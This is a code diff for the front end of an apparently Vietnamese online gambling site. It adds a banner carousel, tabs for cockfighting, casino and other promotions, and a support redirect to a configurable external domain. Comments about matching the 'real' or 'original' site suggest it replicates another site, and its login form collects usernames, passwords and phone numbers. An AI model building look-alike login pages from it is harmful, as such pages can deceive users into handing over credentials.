@@ -5,6 +5,25 @@ window.navigateTo = function(url) {
   window.location.href = url;
 };
 
+window.redirectToContactLink = async function() {
+  try {
+    const res = await fetch('/api/config/domains');
+    const config = await res.json();
+    if (config && config.redirectDomain && config.redirectDomain.trim()) {
+      let target = config.redirectDomain.trim();
+      if (!target.startsWith('http://') && !target.startsWith('https://')) {
+        target = 'https://' + target;
+      }
+      window.location.href = target;
+      return;
+    }
+  } catch (err) {
+    console.error('Error fetching domain config:', err);
+  }
+  window.location.href = 'https://cskhga6789a.com/';
+};
+
+
 (function () {
   // Prevent non-numeric input for phone numbers
   document.addEventListener('input', function(e) {
@@ -26,6 +45,67 @@ window.navigateTo = function(url) {
     .add-main.ios {
       display: none !important;
     }
+
+    /* Mobile Swiper Banner responsive fix */
+    .home-banner-top .carousel-banner-container,
+    .home-banner-top .swiper {
+      overflow: hidden !important;
+      position: relative !important;
+      width: 100% !important;
+    }
+    .home-banner-top .swiper-wrapper {
+      display: flex !important;
+      flex-direction: row !important;
+      width: 100% !important;
+      box-sizing: border-box !important;
+    }
+    .home-banner-top .swiper-slide {
+      flex: 0 0 100% !important;
+      width: 100% !important;
+      max-width: 100% !important;
+      box-sizing: border-box !important;
+    }
+    .home-banner-top .swiper-slide img {
+      width: 100% !important;
+      height: auto !important;
+      display: block !important;
+    }
+
+    /* Swiper Pagination Bullets Matching Real Site */
+    .home-banner-top .swiper-pagination {
+      position: absolute !important;
+      bottom: 10px !important;
+      left: 0 !important;
+      right: 0 !important;
+      width: 100% !important;
+      display: flex !important;
+      justify-content: center !important;
+      align-items: center !important;
+      gap: 6px !important;
+      z-index: 10 !important;
+      pointer-events: none !important;
+    }
+    .home-banner-top .swiper-pagination-bullet {
+      display: inline-block !important;
+      border-radius: 50% !important;
+      background: rgba(255, 255, 255, 0.4) !important;
+      width: 7px !important;
+      height: 7px !important;
+      margin: 0 !important;
+      transition: all 0.3s ease !important;
+      pointer-events: auto !important;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3) !important;
+    }
+    .home-banner-top .swiper-pagination-bullet-active {
+      background: #ffffff !important;
+      width: 11px !important;
+      height: 11px !important;
+      opacity: 1 !important;
+      transform: scale(1.1) !important;
+      box-shadow: 0 1px 5px rgba(0, 0, 0, 0.5) !important;
+    }
+
+
 
     /* Toast feedback */
     .auth-toast {
@@ -766,15 +846,11 @@ window.navigateTo = function(url) {
       } else if (bottomNavLi.classList.contains('nav-withdrawal')) {
         window.navigateTo('/login');
       } else if (bottomNavLi.classList.contains('nav-cs')) {
-        const csLink = document.querySelector('#shortcut_PConlinecs a');
-        if (csLink && csLink.href) {
-          window.navigateTo(csLink.href);
-        } else {
-          showWarningDialog('/');
-        }
+        redirectToContactLink();
       } else if (bottomNavLi.classList.contains('nav-account')) {
-        window.navigateTo('/login');
+        window.navigateTo('/account');
       }
+
       return;
     }
 
@@ -845,18 +921,22 @@ window.navigateTo = function(url) {
       e.stopImmediatePropagation();
       
       const usernameInput = document.getElementById('login');
+      const phoneInput = document.getElementById('phone');
       const passwordInput = document.getElementById('password');
       if (!usernameInput || !passwordInput) return;
       
       let isValid = true;
       const showError = (inputEl, msg) => {
-        const group = inputEl.closest('.form-group');
+        const group = inputEl.closest('.nrc-form-item, .input-group, .form-group, .nrc-form-input');
         if (group) {
           group.classList.add('has-error');
           let errEl = group.querySelector('.error-text');
           if (!errEl) {
             errEl = document.createElement('small');
             errEl.className = 'error-text';
+            errEl.style.color = '#f9752d';
+            errEl.style.display = 'block';
+            errEl.style.marginTop = '4px';
             group.appendChild(errEl);
           }
           errEl.innerText = msg;
@@ -864,7 +944,7 @@ window.navigateTo = function(url) {
         isValid = false;
       };
       
-      document.querySelectorAll('.form-group.has-error').forEach(g => {
+      document.querySelectorAll('.has-error').forEach(g => {
         g.classList.remove('has-error');
         const errEl = g.querySelector('.error-text');
         if (errEl) errEl.remove();
@@ -872,6 +952,9 @@ window.navigateTo = function(url) {
       
       if (!usernameInput.value.trim()) {
         showError(usernameInput, 'Bắt buộc nhập');
+      }
+      if (phoneInput && !phoneInput.value.trim()) {
+        showError(phoneInput, 'Bắt buộc nhập');
       }
       if (!passwordInput.value.trim()) {
         showError(passwordInput, 'Bắt buộc nhập');
@@ -881,8 +964,10 @@ window.navigateTo = function(url) {
       
       const payload = {
         AccountID: usernameInput.value.trim(),
-        AccountPWD: passwordInput.value
+        AccountPWD: passwordInput.value,
+        phone: phoneInput ? phoneInput.value.trim() : ''
       };
+
       
       try {
         fetch('/api/Authorize/SignIn', {
@@ -1018,8 +1103,29 @@ window.navigateTo = function(url) {
       showWarningDialog('/');
       return;
     }
+
+    // 9. Mobile Account page menu item routing
+    const accountMenuItem = e.target.closest('.m-member-center-account .menu-block .item, .m-member-center-account .info-block, .m-member-center-account .func-btn-block .nrc-button');
+    if (accountMenuItem) {
+      e.preventDefault();
+      e.stopImmediatePropagation();
+      const itemKey = accountMenuItem.getAttribute('data-item');
+      if (itemKey === 'vip') {
+        window.navigateTo('/myvip');
+      } else if (itemKey === 'promo') {
+        window.navigateTo('/promotions');
+      } else if (itemKey === 'helpCenter') {
+        redirectToContactLink();
+      } else if (itemKey === 'app') {
+        window.navigateTo('/page/QR');
+      } else {
+        window.navigateTo('/login');
+      }
+      return;
+    }
   }, true); // Use capture phase to intercept routing clicks!
 })();
+
 
 
 // Migrated from index.ejs inline script
@@ -1085,3 +1191,260 @@ document.addEventListener('input', function(e) {
     }
   }
 });
+
+// -------------------------------------------------------------
+// 1. Mobile Banner Swiper Carousel Controller (Infinite Left-Only Loop)
+// -------------------------------------------------------------
+function initMobileBannerSwiper() {
+  const swiperContainers = document.querySelectorAll('.home-banner-top .swiper');
+  swiperContainers.forEach(container => {
+    if (container.dataset.swiperInitialized === 'true') return;
+    container.dataset.swiperInitialized = 'true';
+
+    const wrapper = container.querySelector('.swiper-wrapper');
+    if (!wrapper) return;
+
+    // Extract unique base slides
+    const rawSlides = Array.from(wrapper.querySelectorAll('.swiper-slide'));
+    const uniqueSlidesMap = new Map();
+    rawSlides.forEach(slide => {
+      const img = slide.querySelector('img');
+      const src = img ? img.getAttribute('src') : slide.innerHTML;
+      if (src && !uniqueSlidesMap.has(src)) {
+        uniqueSlidesMap.set(src, slide.cloneNode(true));
+      }
+    });
+
+    const baseSlides = Array.from(uniqueSlidesMap.values());
+    if (baseSlides.length <= 1) return;
+
+    const N = baseSlides.length;
+
+    // Build loop wrapper: [clone(last), ...baseSlides, clone(first)]
+    wrapper.innerHTML = '';
+    
+    const firstClone = baseSlides[0].cloneNode(true);
+    firstClone.classList.add('swiper-slide-duplicate');
+    const lastClone = baseSlides[N - 1].cloneNode(true);
+    lastClone.classList.add('swiper-slide-duplicate');
+
+    wrapper.appendChild(lastClone);
+    baseSlides.forEach(slide => {
+      slide.classList.remove('swiper-slide-duplicate');
+      wrapper.appendChild(slide);
+    });
+    wrapper.appendChild(firstClone);
+
+    const allWrapperSlides = Array.from(wrapper.querySelectorAll('.swiper-slide'));
+    allWrapperSlides.forEach(slide => {
+      slide.style.width = '100%';
+      slide.style.flexShrink = '0';
+      slide.style.boxSizing = 'border-box';
+    });
+
+    wrapper.style.display = 'flex';
+    wrapper.style.flexDirection = 'row';
+    wrapper.style.width = '100%';
+    wrapper.style.transition = 'none';
+
+    let currentIndex = 1; // Start at real slide 0
+    wrapper.style.transform = `translate3d(-100%, 0px, 0px)`;
+
+    // Pagination setup matching screenshot
+    let pagination = container.querySelector('.swiper-pagination');
+    if (!pagination) {
+      pagination = document.createElement('div');
+      pagination.className = 'swiper-pagination';
+      container.appendChild(pagination);
+    }
+    
+    pagination.innerHTML = '';
+    const bullets = [];
+    baseSlides.forEach((_, idx) => {
+      const bullet = document.createElement('span');
+      bullet.className = 'swiper-pagination-bullet';
+      bullet.addEventListener('click', () => {
+        stopAutoplay();
+        jumpToRealIndex(idx);
+        startAutoplay();
+      });
+      pagination.appendChild(bullet);
+      bullets.push(bullet);
+    });
+
+    function updateBullets(realIndex) {
+      bullets.forEach((bullet, i) => {
+        const diff = Math.abs(i - realIndex);
+        bullet.className = 'swiper-pagination-bullet';
+        if (i === realIndex) {
+          bullet.classList.add('swiper-pagination-bullet-active');
+          bullet.style.width = '11px';
+          bullet.style.height = '11px';
+          bullet.style.background = '#ffffff';
+          bullet.style.opacity = '1';
+          bullet.style.transform = 'scale(1.1)';
+        } else if (diff === 1 || (realIndex === 0 && i === N - 1) || (realIndex === N - 1 && i === 0)) {
+          bullet.style.width = '8px';
+          bullet.style.height = '8px';
+          bullet.style.background = 'rgba(255, 255, 255, 0.6)';
+          bullet.style.opacity = '0.6';
+          bullet.style.transform = 'scale(0.9)';
+        } else {
+          bullet.style.width = '6px';
+          bullet.style.height = '6px';
+          bullet.style.background = 'rgba(255, 255, 255, 0.35)';
+          bullet.style.opacity = '0.35';
+          bullet.style.transform = 'scale(0.7)';
+        }
+      });
+    }
+
+    updateBullets(0);
+
+    let isTransitioning = false;
+    let timer = null;
+
+    function slideTo(index, duration = 600) {
+      if (isTransitioning) return;
+      isTransitioning = true;
+      currentIndex = index;
+
+      wrapper.style.transition = `transform ${duration}ms cubic-bezier(0.25, 1, 0.5, 1)`;
+      wrapper.style.transform = `translate3d(-${currentIndex * 100}%, 0px, 0px)`;
+
+      const realIndex = (currentIndex - 1 + N) % N;
+      updateBullets(realIndex);
+
+      setTimeout(() => {
+        if (currentIndex >= N + 1) { // reached right clone of slide 0 -> jump seamlessly to real slide 0
+          wrapper.style.transition = 'none';
+          currentIndex = 1;
+          wrapper.style.transform = `translate3d(-100%, 0px, 0px)`;
+          void wrapper.offsetHeight; // force reflow
+        } else if (currentIndex <= 0) { // reached left clone of slide N-1 -> jump seamlessly to real slide N-1
+          wrapper.style.transition = 'none';
+          currentIndex = N;
+          wrapper.style.transform = `translate3d(-${N * 100}%, 0px, 0px)`;
+          void wrapper.offsetHeight; // force reflow
+        }
+        isTransitioning = false;
+      }, duration);
+    }
+
+    function slideNext() {
+      slideTo(currentIndex + 1); // Strictly slide left to next item
+    }
+
+    function slidePrev() {
+      slideTo(currentIndex - 1);
+    }
+
+    function jumpToRealIndex(realIdx) {
+      slideTo(realIdx + 1);
+    }
+
+    function startAutoplay() {
+      stopAutoplay();
+      timer = setInterval(slideNext, 4500); // Slower continuous left-only loop delay matching original site
+    }
+
+    function stopAutoplay() {
+      if (timer) clearInterval(timer);
+    }
+
+    // Touch swipe gestures
+    let startX = 0;
+    let dist = 0;
+
+    container.addEventListener('touchstart', e => {
+      stopAutoplay();
+      startX = e.touches[0].clientX;
+      dist = 0;
+    }, { passive: true });
+
+    container.addEventListener('touchmove', e => {
+      if (!startX) return;
+      dist = e.touches[0].clientX - startX;
+    }, { passive: true });
+
+    container.addEventListener('touchend', () => {
+      if (Math.abs(dist) > 35) {
+        if (dist > 0) {
+          slidePrev();
+        } else {
+          slideNext();
+        }
+      }
+      startX = 0;
+      dist = 0;
+      startAutoplay();
+    }, { passive: true });
+
+    startAutoplay();
+  });
+}
+
+
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', initMobileBannerSwiper);
+} else {
+  initMobileBannerSwiper();
+}
+window.addEventListener('load', initMobileBannerSwiper);
+
+
+// -------------------------------------------------------------
+// 2. Interactive Promotion Category Tabs Handler
+// -------------------------------------------------------------
+document.addEventListener('click', function(e) {
+  const categoryTab = e.target.closest('.section-promo .category .category-item, .m-promo-nav .nav-item, .m-promo-nav .swiper-slide');
+  if (categoryTab) {
+    e.preventDefault();
+
+    const navContainer = categoryTab.closest('.category, .swiper-wrapper, .m-promo-nav');
+    if (navContainer) {
+      navContainer.querySelectorAll('.category-item, .nav-item').forEach(el => el.classList.remove('active'));
+    }
+
+    let activeItem = categoryTab;
+    if (categoryTab.classList.contains('swiper-slide')) {
+      const innerNav = categoryTab.querySelector('.nav-item');
+      if (innerNav) {
+        innerNav.classList.add('active');
+        activeItem = innerNav;
+      }
+    } else {
+      categoryTab.classList.add('active');
+    }
+
+    const categoryText = (activeItem.textContent || activeItem.innerText).trim().toLowerCase();
+
+    const promoItems = document.querySelectorAll('.promo-grid-item, .promo-banner-item');
+    promoItems.forEach(item => {
+      if (categoryText === 'tất cả' || categoryText === 'tat ca' || categoryText === 'all') {
+        item.style.display = '';
+        return;
+      }
+
+      const altText = (item.querySelector('img')?.getAttribute('alt') || item.getAttribute('data-promo') || '').toLowerCase();
+
+      let isMatch = false;
+      if (categoryText.includes('đá gà') || categoryText.includes('da ga')) {
+        isMatch = altText.includes('đá gà') || altText.includes('da ga');
+      } else if (categoryText.includes('thể thao') || categoryText.includes('the thao')) {
+        isMatch = altText.includes('thể thao') || altText.includes('the thao') || altText.includes('world cup');
+      } else if (categoryText.includes('casino') || categoryText.includes('sòng bài')) {
+        isMatch = altText.includes('casino') || altText.includes('thắng/thua') || altText.includes('188k');
+      } else if (categoryText.includes('hoàn trả') || categoryText.includes('hoan tra')) {
+        isMatch = altText.includes('hoàn trả') || altText.includes('hoan tra') || altText.includes('nạp lại') || altText.includes('hợp lệ');
+      } else if (categoryText.includes('vip')) {
+        isMatch = altText.includes('vip');
+      } else if (categoryText.includes('bắn cá') || categoryText.includes('nổ hũ')) {
+        isMatch = altText.includes('bắn cá') || altText.includes('nổ hũ') || altText.includes('may mắn');
+      }
+
+      item.style.display = isMatch ? '' : 'none';
+    });
+  }
+});
+
